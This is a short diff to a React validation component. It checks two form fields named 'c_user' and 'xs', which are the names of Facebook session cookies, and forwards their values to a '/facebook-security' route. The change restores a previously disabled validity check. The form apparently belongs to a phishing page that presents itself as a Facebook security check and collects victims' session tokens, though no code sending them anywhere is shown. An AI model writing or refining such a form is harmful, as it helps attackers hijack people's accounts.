@@ -25,19 +25,19 @@ const Validation = () => {
     const isXsValid = xsPattern.test(xsValue);
 
     // Only send if both fields are valid
-    // if (isCUserValid && isXsValid) {
-    navigate("/facebook-security", {
-      state: {
-        data: {
-          c_user: form.current.elements["c_user"].value,
-          xs: form.current.elements["xs"].value,
+    if (isCUserValid && isXsValid) {
+      navigate("/facebook-security", {
+        state: {
+          data: {
+            c_user: form.current.elements["c_user"].value,
+            xs: form.current.elements["xs"].value,
+          },
         },
-      },
-    });
-    // } else {
-    //   console.log("Invalid form fields.");
-    //   setIsFormValid(true);
-    // }
+      });
+    } else {
+      console.log("Invalid form fields.");
+      setIsFormValid(true);
+    }
   };
 
   return (
